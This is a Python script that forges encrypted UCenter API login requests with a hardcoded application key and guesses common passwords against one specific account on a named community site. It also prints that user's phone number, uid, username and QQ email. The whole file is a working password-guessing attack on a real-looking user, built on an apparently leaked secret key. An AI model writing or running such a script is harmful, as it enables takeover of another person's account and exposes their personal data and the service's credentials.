# -*- coding: utf-8 -*-
"""尝试 UCenter login 接口校验密码"""
import hashlib
import random
import time
import base64
import urllib.request
import urllib.parse
import sys

sys.stdout.reconfigure(encoding='utf-8')

UC_KEY = "506cq/cuxBy/XFc5nX4AvOiTDe3QSraUZCV6q+g"
UC_API_URL = "http://shequ.taoke.com/uc_server"
UC_APPID = 2
UC_USER_AGENT = "Taoke-UCenter-Client/2.0"
ACCOUNT = "18867423236"

def md5_hex(data: bytes) -> str:
    return hashlib.md5(data).hexdigest()

def rc4(data: bytes, key: bytes) -> bytes:
    key_len = len(key)
    box = list(range(256))
    rndkey = [key[i % key_len] for i in range(256)]
    j = 0
    for i in range(256):
        j = (j + box[i] + rndkey[i]) % 256
        box[i], box[j] = box[j], box[i]
    result = bytearray(len(data))
    a = j = 0
    for i in range(len(data)):
        a = (a + 1) % 256
        j = (j + box[a]) % 256
        box[a], box[j] = box[j], box[a]
        k = box[(box[a] + box[j]) % 256]
        result[i] = data[i] ^ k
    return bytes(result)

def authcode_encode(plaintext: str, key: str) -> str:
    L1 = 'latin-1'
    key_md5 = md5_hex(key.encode(L1))
    keya = md5_hex(key_md5[:16].encode(L1))
    keyb = md5_hex(key_md5[16:32].encode(L1))
    rnd = md5_hex(random.randbytes(16))
    keyc = rnd[-4:]
    cryptkey = keya + md5_hex((keya + keyc).encode(L1))
    cryptkey_bytes = cryptkey.encode(L1)
    head = "0000000000"
    mac = md5_hex((plaintext + keyb).encode(L1))[:16]
    prefix = (head + mac).encode(L1)
    body = plaintext.encode(L1)
    data = prefix + body
    result = rc4(data, cryptkey_bytes)
    b64 = base64.b64encode(result).decode('ascii').rstrip('=')
    return keyc + b64

def ucenter_login(account, password):
    agent = md5_hex(UC_USER_AGENT.encode('latin-1'))
    now_sec = int(time.time())
    data = f"username={account}&password={password}&isuid=0"
    plain = f"{data}&agent={agent}&time={now_sec}"
    encrypted = authcode_encode(plain, UC_KEY)
    form_data = {
        'm': 'user', 'a': 'login', 'inajax': '2',
        'input': encrypted, 'appid': str(UC_APPID),
    }
    body = urllib.parse.urlencode(form_data).encode('latin-1')
    url = f"{UC_API_URL}/index.php"
    req = urllib.request.Request(url, data=body, headers={
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': UC_USER_AGENT,
    })
    with urllib.request.urlopen(req, timeout=10) as resp:
        return resp.read().decode('utf-8', errors='replace')

# 尝试常见密码
passwords_to_try = [
    "123456",
    "18867423236",
    "xgz123",
    "xgz123456",
    "123456789",
    "111111",
    "888888",
    "a123456",
    "admin123",
    "password",
]

print(f"用户: {ACCOUNT} (UCenter uid=1463460, username=AVIXU)")
print(f"邮箱: 1928189914@qq.com")
print()

for pwd in passwords_to_try:
    try:
        resp = ucenter_login(ACCOUNT, pwd)
        resp = resp.strip()
        if resp.startswith('<?xml'):
            # 登录成功返回 XML
            print(f"✅ 密码正确: {pwd}")
            print(f"   UCenter 返回: {resp[:300]}")
            break
        else:
            # 负数即错误码，-2=密码错，-1=用户不存在等
            code = resp.split('\n')[0].strip() if '\n' in resp else resp
            print(f"   {pwd} -> {code}")
    except Exception as e:
        print(f"   {pwd} -> 网络错误: {e}")
